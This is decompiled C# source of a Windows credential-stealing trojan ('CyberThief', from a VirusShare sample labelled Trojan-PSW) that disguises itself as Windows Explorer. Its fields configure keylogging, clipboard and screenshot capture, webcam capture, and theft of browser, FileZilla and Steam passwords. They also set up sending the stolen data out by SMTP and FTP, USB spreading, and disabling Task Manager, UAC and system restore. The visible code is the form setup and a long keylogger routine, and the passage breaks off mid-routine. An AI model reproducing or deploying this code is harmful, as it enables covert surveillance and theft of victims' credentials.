// Decompiled with JetBrains decompiler
// Type: Windows_Explorer.CyberThief
// Assembly: wqeqerwt4354wsey56sey5ts765y54, Version=7.52.5.2, Culture=neutral, PublicKeyToken=null
// MVID: 3FC4189E-BF6F-40C3-B48B-A4DA54DCDC94
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan-PSW.Win32.VB.chm-8bf17b67595d474959c887391b17692103cd2a30a4e2cd4f51f483ad8140b647.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Windows_Explorer.My;
using Windows_Explorer.SQLiteWrapper;

namespace Windows_Explorer
{
  [DesignerGenerated]
  public class CyberThief : Form
  {
    private IContainer components;
    [AccessedThroughProperty("Quotes")]
    private Label _Quotes;
    [AccessedThroughProperty("Timer1")]
    private System.Windows.Forms.Timer _Timer1;
    [AccessedThroughProperty("Timer3")]
    private System.Windows.Forms.Timer _Timer3;
    [AccessedThroughProperty("BackgroundWorker1")]
    private BackgroundWorker _BackgroundWorker1;
    [AccessedThroughProperty("PictureBox1")]
    private PictureBox _PictureBox1;
    [AccessedThroughProperty("Timer4")]
    private System.Windows.Forms.Timer _Timer4;
    [AccessedThroughProperty("Timer5")]
    private System.Windows.Forms.Timer _Timer5;
    [AccessedThroughProperty("Timer6")]
    private System.Windows.Forms.Timer _Timer6;
    [AccessedThroughProperty("Timer7")]
    private System.Windows.Forms.Timer _Timer7;
    [AccessedThroughProperty("BackgroundWorker2")]
    private BackgroundWorker _BackgroundWorker2;
    private const string TheSplit = "alfjklj543l5jkljreiht3i4564hjkl5eskl54jk5ljs4kl5j4ekl5jrklje5tye65r4564";
    private const string BinderSplit = "FDASHTU%YA#EWUTJ^U$#%Y&QA#HUIT$AEJIEQ#AGTJIO$%TJQIO$JQ#";
    [AccessedThroughProperty("CH")]
    private Clipboard _CH;
    private string God;
    private string activewindow;
    private string CurrentClipBoard;
    private string OldClipBoard;
    private string[] Settings;
    private int FTPNumbers;
    private int screeniessaved;
    private string Temp46;
    private string Temp45;
    private string Temp47;
    private string PathWithoutExe;
    private string ThePath;
    private bool HiddenFile;
    private bool Persist;
    private bool HiddenTask;
    private bool DisableTM;
    private bool DisableReg;
    private bool ClearSteam;
    private bool CryptFolder;
    private bool ClipboardLog;
    private bool HideFileExtension;
    private bool SendScreenshots;
    private bool DisableCMD;
    private bool CloseSteam;
    private bool MeltFile;
    private bool DisableUAC;
    private bool WebcamCapture;
    private bool IEClear;
    private bool FFClear;
    private bool WoWClear;
    private bool UseSMTP;
    private bool UseFTP;
    private bool WebsiteBlocker;
    private bool SpecificKeylogging;
    private bool RemoteDownload;
    private bool USBSpread;
    private bool RecordMouse;
    private bool DeleteDataDB;
    private bool DisableSystemRestore;
    private bool RemoteControl;
    private bool BotKiller;
    private bool DoIInstall;
    private bool DoIStartup;
    private bool DoIKeylog;
    private bool DoISteal;
    private bool DoISpread;
    private bool DoIChrome;
    private bool AntiHeavenCheck;
    private string LMouse;
    private string RMouse;
    private string MiddleMouse;
    private bool DataDB;
    private string SQlite;
    private string StealDataDB;
    private string TheShinyColorLocation;
    private string TheIEPath;
    private string ChromePassword;
    private string OldInfectionLocation;
    private int DelayTime;
    private string MutexNumber;
    private string[] Mutual;
    private string NewMutex;
    private string OldMutex;
    private string RemoteSite;
    private string IEPassHolder;
    private int XYZ;
    private bool LMouseToggle;
    private bool RMouseToggle;
    private bool MiddleMouseToggle;
    private bool RegCU;
    private bool RegLM;
    private bool DoIActiveX;
    private bool DelayInfection;
    private string Win1;
    private string Win2;
    private string Win3;
    private string Win4;
    private string Win5;
    private string Win6;
    private string Win7;
    private string Win8;
    private string Win9;
    private string Win10;
    private string FFPasswords;
    private string FileZillaPasswords;
    private string ProductKey;
    private string CDKeys;
    private string ExternalIP;
    private string InternalIP;
    private string Temp43;
    private string Temp44;
    private string MyApplicationName;
    private string MSNInfo;
    private string IMVU;
    private string Pidgin;
    private string DownloadURL;
    private string DownloadName;
    private string ExplorerPass;
    private string SteamUsername;
    private string Email;
    private string Password;
    private string EmailTo;
    private string SMTPServer;
    private string SMTPPort;
    private string LogInterval;
    private string TheGodPath;
    private string ErrorMessage;
    private string ErrorTitle;
    private string ErrorIcon;
    private string DoIError;
    private string RegistryLM;
    private string RegistryCU;
    private string ActiveXKey;
    private string DynDNS;
    private string FTPName;
    private string FTPPass;
    private string FTPHost;
    private string WebsiteURLs;
    private string KeylogOnlyWindows;
    private string ChromePass;
    private string FileName;
    private const uint ALG_CLASS_HASH = 32768;
    private const uint ALG_TYPE_ANY = 0;
    private const uint ALG_CLASS_DATA_ENCRYPT = 24576;
    private const uint ALG_TYPE_STREAM = 2048;
    private const uint ALG_TYPE_BLOCK = 1536;
    private const uint ALG_SID_DES = 1;
    private const uint ALG_SID_RC4 = 1;
    private const uint ALG_SID_RC2 = 2;
    private const uint ALG_SID_MD5 = 3;
    private const uint ALG_SID_SHA = 4;
    public const string MS_DEF_PROV = "Microsoft Base Cryptographic Provider v1.0";
    public const uint PROV_RSA_FULL = 1;
    public const uint CRYPT_EXPORTABLE = 1;
    public static readonly uint CALG_MD5 = 32771;
    public static readonly uint CALG_DES = 26113;
    public static readonly uint CALG_RC2 = 26114;
    public static readonly uint CALG_RC4 = 26625;
    internal const int CALG_SHA = 32772;
    internal const int HP_HASHVAL = 2;
    private static string IE_KEY = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2";
    private static string visited = "";
    private const int ERROR_NO_MORE_ITEMS = 259;
    private const string CryptDll = "advapi32.dll";
    private const string KernelDll = "kernel32.dll";

    public CyberThief()
    {
      this.FormClosing += new FormClosingEventHandler(this.CyberThief_FormClosing);
      this.Load += new EventHandler(this.Form1_Load);
      this.CH = new Clipboard();
      this.FTPNumbers = 0;
      this.screeniessaved = 0;
      this.DataDB = true;
      this.TheShinyColorLocation = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
      this.TheIEPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
      this.XYZ = 0;
      this.InitializeComponent();
    }

    [STAThread]
    public static void Main() => Application.Run((Form) MyProject.Forms.CyberThief);

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.Quotes = new Label();
      this.Timer1 = new System.Windows.Forms.Timer(this.components);
      this.Timer3 = new System.Windows.Forms.Timer(this.components);
      this.BackgroundWorker1 = new BackgroundWorker();
      this.Timer4 = new System.Windows.Forms.Timer(this.components);
      this.Timer5 = new System.Windows.Forms.Timer(this.components);
      this.Timer6 = new System.Windows.Forms.Timer(this.components);
      this.Timer7 = new System.Windows.Forms.Timer(this.components);
      this.BackgroundWorker2 = new BackgroundWorker();
      this.PictureBox1 = new PictureBox();
      ((ISupportInitialize) this.PictureBox1).BeginInit();
      this.SuspendLayout();
      this.Quotes.AutoSize = true;
      Label quotes1 = this.Quotes;
      Point point1 = new Point(30, 42);
      Point point2 = point1;
      quotes1.Location = point2;
      this.Quotes.Name = "Quotes";
      Label quotes2 = this.Quotes;
      Size size1 = new Size(12, 13);
      Size size2 = size1;
      quotes2.Size = size2;
      this.Quotes.TabIndex = 1;
      this.Quotes.Text = "\"";
      this.Quotes.Visible = false;
      this.Timer1.Interval = 300;
      this.Timer3.Interval = 90000;
      this.BackgroundWorker1.WorkerReportsProgress = true;
      this.BackgroundWorker1.WorkerSupportsCancellation = true;
      this.Timer4.Interval = 500;
      this.Timer5.Interval = 5000;
      this.Timer6.Interval = 3000;
      this.Timer7.Interval = 500;
      this.BackgroundWorker2.WorkerReportsProgress = true;
      this.BackgroundWorker2.WorkerSupportsCancellation = true;
      PictureBox pictureBox1_1 = this.PictureBox1;
      point1 = new Point(32, 29);
      Point point3 = point1;
      pictureBox1_1.Location = point3;
      this.PictureBox1.Name = "PictureBox1";
      PictureBox pictureBox1_2 = this.PictureBox1;
      size1 = new Size(10, 10);
      Size size3 = size1;
      pictureBox1_2.Size = size3;
      this.PictureBox1.TabIndex = 4;
      this.PictureBox1.TabStop = false;
      this.PictureBox1.Visible = false;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(0, 0);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.PictureBox1);
      this.Controls.Add((Control) this.Quotes);
      this.FormBorderStyle = FormBorderStyle.None;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (CyberThief);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "The Bypass Server {DEBUG}";
      this.WindowState = FormWindowState.Minimized;
      ((ISupportInitialize) this.PictureBox1).EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual Label Quotes
    {
      [DebuggerNonUserCode] get => this._Quotes;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Quotes = value;
    }

    internal virtual System.Windows.Forms.Timer Timer1
    {
      [DebuggerNonUserCode] get => this._Timer1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        if (this._Timer1 != null)
          this._Timer1.Tick -= eventHandler;
        this._Timer1 = value;
        if (this._Timer1 == null)
          return;
        this._Timer1.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer3
    {
      [DebuggerNonUserCode] get => this._Timer3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer3_Tick);
        if (this._Timer3 != null)
          this._Timer3.Tick -= eventHandler;
        this._Timer3 = value;
        if (this._Timer3 == null)
          return;
        this._Timer3.Tick += eventHandler;
      }
    }

    internal virtual BackgroundWorker BackgroundWorker1
    {
      [DebuggerNonUserCode] get => this._BackgroundWorker1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ProgressChangedEventHandler changedEventHandler = new ProgressChangedEventHandler(this.BackgroundWorker1_ProgressChanged);
        DoWorkEventHandler workEventHandler = new DoWorkEventHandler(this.BackgroundWorker1_DoWork);
        if (this._BackgroundWorker1 != null)
        {
          this._BackgroundWorker1.ProgressChanged -= changedEventHandler;
          this._BackgroundWorker1.DoWork -= workEventHandler;
        }
        this._BackgroundWorker1 = value;
        if (this._BackgroundWorker1 == null)
          return;
        this._BackgroundWorker1.ProgressChanged += changedEventHandler;
        this._BackgroundWorker1.DoWork += workEventHandler;
      }
    }

    internal virtual PictureBox PictureBox1
    {
      [DebuggerNonUserCode] get => this._PictureBox1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._PictureBox1 = value;
    }

    internal virtual System.Windows.Forms.Timer Timer4
    {
      [DebuggerNonUserCode] get => this._Timer4;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer4_Tick);
        if (this._Timer4 != null)
          this._Timer4.Tick -= eventHandler;
        this._Timer4 = value;
        if (this._Timer4 == null)
          return;
        this._Timer4.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer5
    {
      [DebuggerNonUserCode] get => this._Timer5;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer5_Tick);
        if (this._Timer5 != null)
          this._Timer5.Tick -= eventHandler;
        this._Timer5 = value;
        if (this._Timer5 == null)
          return;
        this._Timer5.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer6
    {
      [DebuggerNonUserCode] get => this._Timer6;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer6_Tick);
        if (this._Timer6 != null)
          this._Timer6.Tick -= eventHandler;
        this._Timer6 = value;
        if (this._Timer6 == null)
          return;
        this._Timer6.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer7
    {
      [DebuggerNonUserCode] get => this._Timer7;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer7_Tick);
        if (this._Timer7 != null)
          this._Timer7.Tick -= eventHandler;
        this._Timer7 = value;
        if (this._Timer7 == null)
          return;
        this._Timer7.Tick += eventHandler;
      }
    }

    internal virtual BackgroundWorker BackgroundWorker2
    {
      [DebuggerNonUserCode] get => this._BackgroundWorker2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ProgressChangedEventHandler changedEventHandler = new ProgressChangedEventHandler(this.BackgroundWorker2_ProgressChanged);
        DoWorkEventHandler workEventHandler = new DoWorkEventHandler(this.BackgroundWorker2_DoWork);
        if (this._BackgroundWorker2 != null)
        {
          this._BackgroundWorker2.ProgressChanged -= changedEventHandler;
          this._BackgroundWorker2.DoWork -= workEventHandler;
        }
        this._BackgroundWorker2 = value;
        if (this._BackgroundWorker2 == null)
          return;
        this._BackgroundWorker2.ProgressChanged += changedEventHandler;
        this._BackgroundWorker2.DoWork += workEventHandler;
      }
    }

    private virtual Clipboard CH
    {
      [DebuggerNonUserCode] get => this._CH;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        Clipboard.ChangedEventHandler changedEventHandler = new Clipboard.ChangedEventHandler(this.CH_Changed);
        if (this._CH != null)
          this._CH.Changed -= changedEventHandler;
        this._CH = value;
        if (this._CH == null)
          return;
        this._CH.Changed += changedEventHandler;
      }
    }

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetForegroundWindow();

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetWindowText(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

    public void KeyManager(Keys Key)
    {
      if (MyProject.Computer.Keyboard.CtrlKeyDown & Key == Keys.C)
        this.God += " [Copy] ";
      else if (MyProject.Computer.Keyboard.CtrlKeyDown & Key == Keys.V)
        this.God += " [Paste] ";
      else if (!MyProject.Computer.Keyboard.ShiftKeyDown & !MyProject.Computer.Keyboard.CapsLock)
      {
        if (Key == Keys.A)
          this.God += "a";
        else if (Key == Keys.B)
          this.God += "b";
        else if (Key == Keys.C)
          this.God += "c";
        else if (Key == Keys.D)
          this.God += "d";
        else if (Key == Keys.E)
          this.God += "e";
        else if (Key == Keys.F)
          this.God += "f";
        else if (Key == Keys.G)
          this.God += "g";
        else if (Key == Keys.H)
          this.God += "h";
        else if (Key == Keys.I)
          this.God += "i";
        else if (Key == Keys.J)
          this.God += "j";
        else if (Key == Keys.K)
          this.God += "k";
        else if (Key == Keys.L)
          this.God += "l";
        else if (Key == Keys.M)
          this.God += "m";
        else if (Key == Keys.N)
          this.God += "n";
        else if (Key == Keys.O)
          this.God += "o";
        else if (Key == Keys.P)
          this.God += "p";
        else if (Key == Keys.Q)
          this.God += "q";
        else if (Key == Keys.R)
          this.God += "r";
        else if (Key == Keys.S)
          this.God += "s";
        else if (Key == Keys.T)
          this.God += "t";
        else if (Key == Keys.U)
          this.God += "u";
        else if (Key == Keys.V)
          this.God += "v";
        else if (Key == Keys.W)
          this.God += "w";
        else if (Key == Keys.X)
          this.God += "x";
        else if (Key == Keys.Y)
          this.God += "y";
        else if (Key == Keys.Z)
          this.God += "z";
        else if (Key == Keys.D0)
          this.God += "0";
        else if (Key == Keys.D1)
          this.God += "1";
        else if (Key == Keys.D2)
          this.God += "2";
        else if (Key == Keys.D3)
          this.God += "3";
        else if (Key == Keys.D4)
          this.God += "4";
        else if (Key == Keys.D5)
          this.God += "5";
        else if (Key == Keys.D6)
          this.God += "6";
        else if (Key == Keys.D7)
          this.God += "7";
        else if (Key == Keys.D8)
          this.God += "8";
        else if (Key == Keys.D9)
          this.God += "9";
        else if (Key == Keys.NumPad0)
          this.God += "0";
        else if (Key == Keys.NumPad1)
          this.God += "1";
        else if (Key == Keys.NumPad2)
          this.God += "2";
        else if (Key == Keys.NumPad3)
          this.God += "3";
        else if (Key == Keys.NumPad4)
          this.God += "4";
        else if (Key == Keys.NumPad5)
          this.God += "5";
        else if (Key == Keys.NumPad6)
          this.God += "6";
        else if (Key == Keys.NumPad7)
          this.God += "7";
        else if (Key == Keys.NumPad8)
          this.God += "8";
        else if (Key == Keys.NumPad9)
          this.God += "9";
        else if (Key == Keys.Oemcomma)
          this.God += ",";
        else if (Key == Keys.OemMinus)
          this.God += "-";
        else if (Key == Keys.OemQuotes)
          this.God += "'";
        else if (Key == Keys.OemOpenBrackets)
          this.God += "[";
        else if (Key == Keys.OemCloseBrackets)
          this.God += "]";
        else if (Key == Keys.OemQuestion)
          this.God += "/";
        else if (Key == Keys.OemPipe)
          this.God += "\\";
        else if (Key == Keys.OemSemicolon)
          this.God += ";";
        else if (Key == Keys.OemPeriod)
          this.God += ".";
        else if (Key == Keys.Oemtilde)
          this.God += "`";
        else if (Key == Keys.Space)
          this.God += " ";
        else if (Key == Keys.Return)
          this.God += "\r\n";
        else if (Key == Keys.F1)
          this.God += "[F1]";
        else if (Key == Keys.F2)
          this.God += "[F2]";
        else if (Key == Keys.F3)
          this.God += "[F3]";
        else if (Key == Keys.F4)
          this.God += "[F4]";
        else if (Key == Keys.F5)
          this.God += "[F5]";
        else if (Key == Keys.F6)
          this.God += "[F6]";
        else if (Key == Keys.F7)
          this.God += "[F7]";
        else if (Key == Keys.F8)
          this.God += "[F8]";
        else if (Key == Keys.F9)
          this.God += "[F9]";
        else if (Key == Keys.F10)
          this.God += "[F10]";
        else if (Key == Keys.F11)
          this.God += "[F11]";
        else if (Key == Keys.F12)
          this.God += "[F12]";
        else if (Key == Keys.Delete)
        {
          if (this.God.EndsWith("\r\n") || this.God.EndsWith("|") || this.God.EndsWith("]"))
            return;
          this.God = this.God.Substring(0, checked (this.God.Length - 1));
        }
        else if (Key == Keys.Back)
        {
          if (this.God.EndsWith("\r\n") || this.God.EndsWith("|") || this.God.EndsWith("]"))
            return;
          this.God = this.God.Substring(0, checked (this.God.Length - 1));
        }
        else if (Key == Keys.Down)
          this.God += "";
        else if (Key == Keys.Up)
          this.God += "";
        else if (Key == Keys.Left)
          this.God += "";
        else if (Key == Keys.Right)
          this.God += "";
        else if (Key == Keys.Tab)
          this.God += "[TAB]";
        else if (Key == Keys.End)
          this.God += "[END]";
        else if (Key == Keys.Escape)
          this.God += "[ESC]";
        else if (Key == Keys.Divide)
          this.God += "/";
        else if (Key == Keys.Decimal)
          this.God += ".";
        else if (Key == Keys.Subtract)
          this.God += "-";
        else if (Key == Keys.Add)
          this.God += "+";
        else if (Key == Keys.Multiply)
          this.God += "*";
        else if (Key == Keys.ControlKey)
          this.God += "[CTRL]";
        else if (Key == Keys.Alt)
          this.God += "[ALT]";
        else if (Key == Keys.Prior)
          this.God += "[Page Up]";
        else if (Key == Keys.Next)
          this.God += "[Page Down]";
        else if (Key == Keys.Home)
          this.God += "[Home]";
        else if (Key == Keys.Insert)
          this.God += "[Insert]";
        else if (Key == Keys.End)
          this.God += "[End]";
        else if (Key == Keys.Escape)
        {
          this.God += "[Esc]";
        }
        else
        {
          if (Key != Keys.Snapshot)
            return;
          this.God += "[Prt Screen]";
        }
      }
      else if (!MyProject.Computer.Keyboard.ShiftKeyDown & MyProject.Computer.Keyboard.CapsLock)
      {
        if (Key == Keys.A)
          this.God += "A";
        else if (Key == Keys.B)
          this.God += "B";
        else if (Key == Keys.C)
          this.God += "C";
        else if (Key == Keys.D)
          this.God += "D";
        else if (Key == Keys.E)
          this.God += "E";
        else if (Key == Keys.F)
          this.God += "F";
        else if (Key == Keys.G)
          this.God += "G";
        else if (Key == Keys.H)
          this.God += "H";
        else if (Key == Keys.I)
          this.God += "I";
        else if (Key == Keys.J)
          this.God += "J";
        else if (Key == Keys.K)
          this.God += "K";
        else if (Key == Keys.L)
          this.God += "L";
        else if (Key == Keys.M)
          this.God += "M";
        else if (Key == Keys.N)
          this.God += "N";
        else if (Key == Keys.O)
          this.God += "O";
        else if (Key == Keys.P)
          this.God += "P";
        else if (Key == Keys.Q)
          this.God += "Q";
        else if (Key == Keys.R)
          this.God += "R";
        else if (Key == Keys.S)
          this.God += "S";
        else if (Key == Keys.T)
          this.God += "T";
        else if (Key == Keys.U)
          this.God += "U";
        else if (Key == Keys.V)
          this.God += "V";
        else if (Key == Keys.W)
          this.God += "W";
        else if (Key == Keys.X)
          this.God += "X";
        else if (Key == Keys.Y)
          this.God += "Y";
        else if (Key == Keys.Z)
          this.God += "Z";
        else if (Key == Keys.D0)
          this.God += "0";
        else if (Key == Keys.D1)
          this.God += "1";
        else if (Key == Keys.D2)
          this.God += "2";
        else if (Key == Keys.D3)
          this.God += "3";
        else if (Key == Keys.D4)
          this.God += "4";
        else if (Key == Keys.D5)
          this.God += "5";
        else if (Key == Keys.D6)
          this.God += "6";
        else if (Key == Keys.D7)
          this.God += "7";
        else if (Key == Keys.D8)
          this.God += "8";
        else if (Key == Keys.D9)
          this.God += "9";
        else if (Key == Keys.NumPad0)
          this.God += "0";
        else if (Key == Keys.NumPad1)
          this.God += "1";
        else if (Key == Keys.NumPad2)
          this.God += "2";
        else if (Key == Keys.NumPad3)
          this.God += "3";
        else if (Key == Keys.NumPad4)
          this.God += "4";
        else if (Key == Keys.NumPad5)
          this.God += "5";
        else if (Key == Keys.NumPad6)
          this.God += "6";
        else if (Key == Keys.NumPad7)
          this.God += "7";
        else if (Key == Keys.NumPad8)
          this.God += "8";
        else if (Key == Keys.NumPad9)
          this.God += "9";
        else if (Key == Keys.Oemcomma)
          this.God += ",";
        else if (Key == Keys.OemMinus)
          this.God += "-";
        else if (Key == Keys.OemQuotes)
          this.God += "'";
        else if (Key == Keys.OemOpenBrackets)
          this.God += "[";
        else if (Key == Keys.OemCloseBrackets)
          this.God += "]";
        else if (Key == Keys.OemQuestion)
          this.God += "/";
        else if (Key == Keys.OemPipe)
          this.God += "\\";
        else if (Key == Keys.OemSemicolon)
          this.God += ";";
        else if (Key == Keys.OemPeriod)
          this.God += ".";
        else if (Key == Keys.Oemtilde)
          this.God += "`";
        else if (Key == Keys.Space)
          this.God += " ";
        else if (Key == Keys.Return)
          this.God += "\r\n";
        else if (Key == Keys.F1)
          this.God += "[F1]";
        else if (Key == Keys.F2)
          this.God += "[F2]";
        else if (Key == Keys.F3)
          this.God += "[F3]";
        else if (Key == Keys.F4)
          this.God += "[F4]";
        else if (Key == Keys.F5)
          this.God += "[F5]";
        else if (Key == Keys.F6)
          this.God += "[F6]";
        else if (Key == Keys.F7)
          this.God += "[F7]";
        else if (Key == Keys.F8)
          this.God += "[F8]";
        else if (Key == Keys.F9)
          this.God += "[F9]";
        else if (Key == Keys.F10)
          this.God += "[F10]";
        else if (Key == Keys.F11)
          this.God += "[F11]";
        else if (Key == Keys.F12)
          this.God += "[F12]";
        else if (Key == Keys.Delete)
        {
          if (this.God.EndsWith("\r\n") || this.God.EndsWith("|") || this.God.EndsWith("]"))
            return;
          this.God = this.God.Substring(0, checked (this.God.Length - 1));
        }
        else if (Key == Keys.Back)
        {
          if (this.God.EndsWith("\r\n") || this.God.EndsWith("|") || this.God.EndsWith("]"))
            return;
          this.God = this.God.Substring(0, checked (this.God.Length - 1));
        }
        else if (Key == Keys.Down)
          this.God += "";
        else if (Key == Keys.Up)
          this.God += "";
        else if (Key == Keys.Left)
          this.God += "";
        else if (Key == Keys.Right)
          this.God += "";
        else if (Key == Keys.Tab)
          this.God += "[TAB]";
        else if (Key == Keys.End)
          this.God += "[END]";
        else if (Key == Keys.Escape)
          this.God += "[ESC]";
        else if (Key == Keys.Divide)
          this.God += "/";
        else if (Key == Keys.Decimal)
          this.God += ".";
        else if (Key == Keys.Subtract)
          this.God += "-";
        else if (Key == Keys.Add)
          this.God += "+";
        else if (Key == Keys.Multiply)
          this.God += "*";
        else if (Key == Keys.ControlKey)
          this.God += "[CTRL]";
        else if (Key == Keys.Alt)
          this.God += "[ALT]";
        else if (Key == Keys.Prior)
          this.God += "[Page Up]";
        else if (Key == Keys.Next)
          this.God += "[Page Down]";
        else if (Key == Keys.Home)
          this.God += "[Home]";
        else if (Key == Keys.Insert)
          this.God += "[Insert]";
        else if (Key == Keys.End)
          this.God += "[End]";
        else if (Key == Keys.Escape)
        {
          this.God += "[Esc]";
        }
        else
        {
          if (Key != Keys.Snapshot)
            return;
          this.God += "[Prt Screen]";
        }
      }
      else if (MyProject.Computer.Keyboard.ShiftKeyDown & MyProject.Computer.Keyboard.CapsLock)
      {
        if (Key == Keys.D1)
          this.God += "!";
        else if (Key == Keys.D2)
          this.God += "@";
        else if (Key == Keys.D3)
          this.God += "#";
        else if (Key == Keys.D4)
          this.God += "$";
        else if (Key == Keys.D5)
          this.God += "%";
        else if (Key == Keys.D6)
          this.God += "^";
        else if (Key == Keys.D7)
          this.God += "&";
        else if (Key == Keys.D8)
          this.God += "*";
        else if (Key == Keys.D9)
          this.God += "(";
        else if (Key == Keys.D0)
          this.God += ")";
        else if (Key == Keys.A)
          this.God += "A";
        else if (Key == Keys.B)
          this.God += "B";
        else if (Key == Keys.C)
          this.God += "C";
        else if (Key == Keys.D)
          this.God += "D";
        else if (Key == Keys.E)
          this.God += "E";
        else if (Key == Keys.F)
          this.God += "F";
        else if (Key == Keys.G)
          this.God += "G";
        else if (Key == Keys.H)
          this.God += "H";
        else if (Key == Keys.I)
          this.God += "I";
        else if (Key == Keys.J)
          this.God += "J";
        else if (Key == Keys.K)
          this.God += "K";
        else if (Key == Keys.L)
          this.God += "L";
        else if (Key == Keys.M)
          this.God += "M";
        else if (Key == Keys.N)
          this.God += "N";
        else if (Key == Keys.O)
          this.God += "O";
        else if (Key == Keys.P)
          this.God += "P";
        else if (Key == Keys.Q)
          this.God += "Q";
        else if (Key == Keys.R)
          this.God += "R";
        else if (Key == Keys.S)
          this.God += "S";
        else if (Key == Keys.T)
          this.God += "T";
        else if (Key == Keys.U)
          this.God += "U";
        else if (Key == Keys.V)
          this.God += "V";
        else if (Key == Keys.W)
          this.God += "W";
        else if (Key == Keys.X)
          this.God += "X";
        else if (Key == Keys.Y)
          this.God += "Y";
        else if (Key == Keys.Z)
          this.God += "Z";
        else if (Key == Keys.Oemcomma)
          this.God += "<";
        else if (Key == Keys.OemMinus)
          this.God += "_";
        else if (Key == Keys.OemOpenBrackets)
          this.God += "{";
        else if (Key == Keys.OemCloseBrackets)
          this.God += "}";
        else if (Key == Keys.OemQuestion)
          this.God += "?";
        else if (Key == Keys.OemPipe)
          this.God += "|";
        else if (Key == Keys.OemSemicolon)
          this.God += ":";
        else if (Key == Keys.OemPeriod)
          this.God += ">";
        else if (Key == Keys.Oemtilde)
          this.God += "~";
        else if (Key == Keys.OemQuotes)
          this.God += this.Quotes.Text;
        else if (Key == Keys.Space)
          this.God += " ";
        else if (Key == Keys.Return)
          this.God += "\r\n";
        else if (Key == Keys.F1)
          this.God += "[F1]";
        else if (Key == Keys.F2)
          this.God += "[F2]";
        else if (Key == Keys.F3)
          this.God += "[F3]";
        else if (Key == Keys.F4)
          this.God += "[F4]";
        else if (Key == Keys.F5)
          this.God += "[F5]";
        else if (Key == Keys.F6)
          this.God += "[F6]";
        else if (Key == Keys.F7)
          this.God += "[F7]";
        else if (Key == Keys.F8)
          this.God += "[F8]";
        else if (Key == Keys.F9)
          this.God += "[F9]";
        else if (Key == Keys.F10)
          this.God += "[F10]";
        else if (Key == Keys.F11)
          this.God += "[F11]";
        else if (Key == Keys.F12)
          this.God += "[F12]";
        else if (Key == Keys.Delete)
          this.God += "[DEL]";
        else if (Key == Keys.Back)
          this.God += "[DEL]";
        else if (Key == Keys.Down)
          this.God += "";
        else if (Key == Keys.Up)
          this.God += "";
        else if (Key == Keys.Left)
          this.God += "";
        else if (Key == Keys.Right)
          this.God += "";
        else if (Key == Keys.Tab)
          this.God += "[TAB]";
        else if (Key == Keys.End)
          this.God += "[END]";
        else if (Key == Keys.Escape)
          this.God += "[ESC]";
        else if (Key == Keys.Divide)
          this.God += "/";
        else if (Key == Keys.Decimal)
          this.God += ".";
        else if (Key == Keys.Subtract)
          this.God += "-";
        else if (Key == Keys.Add)
          this.God += "+";
        else if (Key == Keys.Multiply)
          this.God += "*";
        else if (Key == Keys.ControlKey)
          this.God += "[CTRL]";
        else if (Key == Keys.Alt)
          this.God += "[ALT]";
        else if (Key == Keys.Prior)
          this.God += "[Page Up]";
        else if (Key == Keys.Next)
          this.God += "[Page Down]";
        else if (Key == Keys.Home)
          this.God += "[Home]";
        else if (Key == Keys.Insert)
          this.God += "[Insert]";
        else if (Key == Keys.End)
          this.God += "[End]";
        else if (Key == Keys.Escape)
        {
          this.God += "[Esc]";
        }
        else
        {
          if (Key != Keys.Snapshot)
            return;
          this.God += "[Prt Screen]";
        }
      }
      else if (!MyProject.Computer.Keyboard.ShiftKeyDown & MyProject.Computer.Keyboard.CapsLock)
      {
        if (Key == Keys.D1)
          this.God += "1";
